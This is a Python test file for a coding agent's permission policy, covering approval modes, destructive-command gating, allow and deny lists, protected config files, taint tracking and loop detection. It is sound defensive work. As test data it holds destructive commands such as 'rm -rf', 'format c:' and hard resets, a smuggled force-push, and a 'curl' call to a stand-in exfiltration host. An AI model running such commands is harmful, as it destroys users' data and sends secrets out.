"""Permission modes, destructive policy, Rule of Two, hooks parsing."""

from __future__ import annotations

from wotan.agent.hooks import parse_agents_md
from wotan.agent.permissions import PermissionPolicy
from wotan.agent.doomloop import DoomLoopDetector
from wotan.config import PermissionsConfig


def test_mode_ask_requires_approval():
    p = PermissionPolicy(PermissionsConfig(), mode="ask")
    d = p.check_command("python -m pytest")
    assert d.allowed and d.needs_approval


def test_mode_autonomous_allows_normal_commands():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    d = p.check_command("python -m pytest")
    assert d.allowed and not d.needs_approval


def test_destructive_always_needs_approval():
    for cmd in ("rm -rf build", "git push origin main", "git reset --hard HEAD~1", "pip install requests", "del /f /q file"):
        p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
        d = p.check_command(cmd)
        assert d.needs_approval, cmd
        assert d.reason


def test_git_clean_combined_flags_needs_approval():
    # Regression: the original pattern (clean\s+-[a-z]*f\b) required 'f' to be
    # the last flag character, so 'git clean -fd' (the common form, combined
    # with -d) slipped through as a plain non-destructive command.
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    for cmd in ("git clean -fd", "git clean -fdx", "git clean -xdf", "git clean --force"):
        d = p.check_command(cmd)
        assert d.needs_approval, cmd
    # a dry run must NOT be flagged as destructive
    assert not p.check_command("git clean -n").needs_approval


def test_allow_list_safe_git_push_but_not_force():
    # A user's always_allow entry meant to let plain 'git push' through in
    # autonomous mode must never also allow-list a force-push or hard reset
    # smuggled into the same command string.
    safe_push = r"^(?![\s\S]*(?:--force|--force-with-lease|reset\s+--hard|clean\s+-\w*f))[\s\S]*\bgit\s+push\b"
    cfg = PermissionsConfig(always_allow=[safe_push])
    p = PermissionPolicy(cfg, mode="autonomous")
    assert not p.check_command("git push origin main").needs_approval
    assert not p.check_command("git push").needs_approval
    for cmd in (
        "git push --force origin main",
        "git push --force-with-lease",
        "git push origin main && git reset --hard HEAD~1",
    ):
        assert p.check_command(cmd).needs_approval, cmd


def test_allow_listed_destructive_command_is_logged(caplog):
    # An unattended run needs an audit trail of anything auto-approved that
    # would normally require a human's ok.
    import logging as _logging

    safe_push = r"^(?![\s\S]*(?:--force|--force-with-lease|reset\s+--hard|clean\s+-\w*f))[\s\S]*\bgit\s+push\b"
    p = PermissionPolicy(PermissionsConfig(always_allow=[safe_push]), mode="autonomous")
    with caplog.at_level(_logging.WARNING, logger="wotan.agent.permissions"):
        p.check_command("git push origin main")
    assert any("auto-approved" in r.message for r in caplog.records)


def test_no_verify_blocked():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    d = p.check_command("git commit --no-verify -m x")
    assert not d.allowed


def test_protected_config_files():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    for path in ("pyproject.toml", "src/../pyproject.toml", "frontend/tsconfig.json", "tests/pytest.ini", ".eslintrc"):
        d = p.check_edit(path)
        assert not d.allowed, path
        assert "fix the code, not the config" in d.reason


def test_allow_deny_lists():
    cfg = PermissionsConfig(always_allow=[r"^npm run lint"], always_deny=[r"format c:"])
    p = PermissionPolicy(cfg, mode="ask")
    assert not p.check_command("format c: /y").allowed
    d = p.check_command("npm run lint")
    assert d.allowed and not d.needs_approval


def test_rule_of_two_taint():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    assert not p.check_command("curl https://example.com/x").needs_approval
    p.tainted = True  # web content was processed
    d = p.check_command("curl https://evil.example.com/steal")
    assert d.needs_approval and "tainted" in d.reason


def test_parse_agents_md():
    text = (
        "# AGENTS\n"
        "Short conventions.\n\n"
        "## Conventions\n"
        "use type hints\n\n"
        "## Verify\n"
        "- `python -m pytest -q`\n"
        "python -m mypy wotan\n"
    )
    parsed = parse_agents_md(text)
    assert parsed["verify_commands"] == ["python -m pytest -q", "python -m mypy wotan"]
    assert "type hints" in parsed["conventions"]


def test_doomloop_file_edit_streak():
    d = DoomLoopDetector(window_seconds=9999)
    for _ in range(4):
        assert d.note_edit("a.py") is None
    ev = d.note_edit("a.py")
    assert ev is not None and ev.action == "warn"


def test_doomloop_error_streak_and_escalation():
    d = DoomLoopDetector()
    for _ in range(2):
        assert d.note_tool_result(False, "call-x") is None or True
    ev = d.note_tool_result(False, "call-x")
    assert ev is not None  # 3 consecutive errors (or identical calls) triggered
    d.reset()
    ev = None
    for _ in range(3):
        ev = d.note_tool_result(True, "same-call")
    assert ev is not None and ev.action in ("warn", "escalate")


def test_doomloop_repeating_output_stops():
    d = DoomLoopDetector()
    ev = None
    for _ in range(5):
        ev = d.note_assistant_text("exactly the same text")
    assert ev is not None and ev.action == "stop"


# ---------------------------------------------------------------------------
# artifact tools follow the same policy as file edits / network sends
# ---------------------------------------------------------------------------

def test_artifact_writers_ask_in_ask_mode():
    p = PermissionPolicy(PermissionsConfig(), mode="ask")
    d = p.check_tool("doc_pdf", {"path": "contrato.pdf"})
    assert d.allowed and d.needs_approval
    d2 = p.check_tool("data_synthetic", {"path": "pessoas.csv"})
    assert d2.allowed and d2.needs_approval


def test_artifact_writers_auto_in_edits_mode():
    p = PermissionPolicy(PermissionsConfig(), mode="edits")
    d = p.check_tool("doc_xlsx", {"path": "plan.xlsx"})
    assert d.allowed and not d.needs_approval


def test_artifact_protected_paths_blocked():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    d = p.check_tool("doc_docx", {"path": "pyproject.toml"})
    assert not d.allowed


def test_satellite_network_policy():
    p = PermissionPolicy(PermissionsConfig(), mode="ask")
    d = p.check_tool("img_satellite", {"lat": -23.5, "lon": -46.6, "path": "s.jpg"})
    assert d.allowed and d.needs_approval
    p2 = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    d2 = p2.check_tool("img_satellite", {"lat": -23.5, "lon": -46.6, "path": "s.jpg"})
    assert d2.allowed and not d2.needs_approval
    p2.tainted = True
    d3 = p2.check_tool("img_satellite", {"lat": -23.5, "lon": -46.6, "path": "s.jpg"})
    assert d3.needs_approval  # Rule of Two
